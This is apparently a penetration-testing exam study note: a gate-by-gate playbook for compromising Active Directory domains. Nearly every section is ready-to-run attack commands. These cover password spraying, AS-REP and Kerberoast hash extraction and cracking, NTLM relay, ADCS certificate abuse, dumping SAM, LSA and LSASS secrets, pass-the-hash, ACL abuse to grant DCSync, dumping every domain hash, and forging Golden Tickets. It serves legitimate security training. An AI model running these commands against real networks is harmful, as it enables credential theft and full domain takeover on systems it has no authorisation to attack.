# 🧭 Which AD Attack, When?

> Every AD attack has a **precondition** — what you must already hold. So "when do I try it?" = "what do I have *right now*?" Find your current gate below and run its moves. Every new credential sends you back to the **one-cred** gate to reuse it everywhere.

Part of [[Active Directory]]. See also [[AD Attack Framework]] (the 9 positions) · [[Exam AD Set — Solve Overview]].

```bash
export DC=<DC_IP> DOMAIN=<domain.tld> U=<user> P='<pass>' BASE='DC=<dom>,DC=<tld>'
echo "$DC dc01.$DOMAIN $DOMAIN" | sudo tee -a /etc/hosts ; sudo ntpdate $DC   # always first (Kerberos)
```

---

## 🟥 Gate 0 — NO credentials yet
Goal: earn the first cred. Only these need nothing.

**Anonymous enumeration (always first)** — userlist + passwords in `description`:
```bash
netexec smb $DC -u '' -p '' --rid-brute          # users via SID walking
rpcclient -U "" -N $DC -c "enumdomusers;getdompwinfo"   # users + LOCKOUT policy
ldapsearch -x -H ldap://$DC -b "$BASE" "(objectClass=user)" sAMAccountName description | grep -iE 'sAMAccountName|description'
```
**AS-REP Roasting** — *precondition:* a userlist + any user with pre-auth disabled. *Free, no lockout:*
```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```
**Password spraying** — *precondition:* userlist + a likely password, **lockout checked first**:
```bash
netexec smb $DC --pass-pol                        # confirm threshold BEFORE spraying
netexec smb $DC -u users.txt -p 'Season2025!' --continue-on-success
```
**ADCS ESC8 / NTLM relay** — *precondition:* web-enroll CA or `signing:False` + coercion (situational):
```bash
netexec smb $DC --gen-relay-list relay.txt        # hosts with signing:False
certipy relay -target 'http://<CA_HOST>' -template DomainController   # + coerce the DC
```

## 🟧 Gate 1 — ONE domain credential (any user)
Unlocks the most. Run these **in parallel** the moment you get a cred.

**BloodHound** — *plan the path first:*
```bash
bloodhound-python -u $U -p "$P" -d $DOMAIN -dc dc01.$DOMAIN -c all -ns $DC   # mark owned → Shortest Path to DA
```
**Kerberoasting** — *precondition:* one valid cred (the only requirement):
```bash
impacket-GetUserSPNs "$DOMAIN/$U:$P" -dc-ip $DC -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```
**Credential reuse / spray the cred across every host** — find where it's admin (`(Pwn3d!)`):
```bash
netexec smb <range> -u $U -p "$P" --continue-on-success     # also winrm / mssql / rdp
```
**ADCS template abuse (ESC1–4)** — *precondition:* a vulnerable template + this cred:
```bash
certipy find -u $U@$DOMAIN -p "$P" -dc-ip $DC -vulnerable -stdout
certipy req  -u $U@$DOMAIN -p "$P" -ca '<CA>' -template '<VulnTmpl>' -upn administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC               # → NT hash + TGT
```

## 🟨 Gate 2 — A cred/hash that is local admin somewhere (`(Pwn3d!)`)
**Shell + dump credentials** (incl. cached Domain Admin):
```bash
impacket-psexec $DOMAIN/$U:"$P"@<HOST>            # SYSTEM (or wmiexec = quieter)
netexec smb <HOST> -u $U -p "$P" --sam --lsa     # local hashes + LSA secrets (service-acct cleartext)
netexec smb <HOST> -u $U -p "$P" -M lsassy       # cached domain creds from LSASS
```
**Pass-the-Hash** — *precondition:* you have an NT hash, not plaintext:
```bash
netexec smb <range> -u <user> -H <NThash>        # reuse across the subnet
impacket-psexec <user>@<HOST> -hashes :<NThash>
```

## 🟩 Gate 3 — BloodHound shows you hold an ACL edge
Match the edge → its abuse ([[AD ACL Abuse]]):
```bash
# ForceChangePassword — reset their password:
net rpc password "<target>" "NewPass123!" -U "$DOMAIN/$U%$P" -S $DC
# AddMember / GenericWrite on a group — add yourself:
bloodyAD -u $U -p "$P" -d $DOMAIN --host $DC add groupMember "<Group>" $U
# GenericAll on a user — targeted Kerberoast:
bloodyAD -u $U -p "$P" -d $DOMAIN --host $DC set object <target> servicePrincipalName -v "fake/svc"
impacket-GetUserSPNs "$DOMAIN/$U:$P" -dc-ip $DC -request-user <target>   # → -m 13100
# WriteDACL / WriteOwner — grant yourself DCSync, then → Gate 4:
impacket-dacledit -action write -rights DCSync -principal $U -target-dn "$BASE" "$DOMAIN/$U:$P"
```

## 🟦 Gate 4 — DCSync rights or Domain Admin
```bash
impacket-secretsdump "$DOMAIN/$U:$P"@$DC -just-dc-ntlm        # krbtgt + every NTLM hash
impacket-psexec "$DOMAIN/Administrator"@$DC -hashes :<DA_NTHASH>   # SYSTEM on the DC → proof
# Golden Ticket (persistence) — needs krbtgt hash + domain SID:
impacket-lookupsid "$DOMAIN/$U"@$DC -hashes :<DA_NTHASH>      # grab the SID
impacket-ticketer -nthash <krbtgt_NT> -domain-sid <SID> -domain $DOMAIN Administrator
```

---

## ⚡ Signal → attack (quick index)
| You see / hold | Attack | Gate |
|---|---|---|
| Nothing (network only) | anon enum · AS-REP · spray · relay | 0 |
| A userlist, no creds | **AS-REP roast** (pre-auth off) | 0 |
| `signing:False` + coercion | **NTLM relay** / ESC8 | 0 |
| Any one domain cred | **Kerberoast** + **BloodHound** + reuse | 1 |
| Vulnerable cert template | **ADCS ESCx** → NT hash | 1 |
| `(Pwn3d!)` on a host | psexec → **dump SAM/LSA/LSASS** | 2 |
| An NT hash (no plaintext) | **Pass-the-Hash** | 2 |
| BloodHound ACL edge | **match the edge** (reset/add/roast/dacledit) | 3 |
| `GetChanges`+`GetChangesAll` / DA | **DCSync** → krbtgt + Golden Ticket | 4 |

## 🧠 The one-line rule
**No creds → roast / spray / relay. One cred → BloodHound + Kerberoast + reuse. Admin on a box → dump creds. An edge → abuse it to DCSync. DCSync → own the domain.** Clock-sync + `/etc/hosts` before anything Kerberos; check lockout before any spray; **pass hashes, don't crack them**.
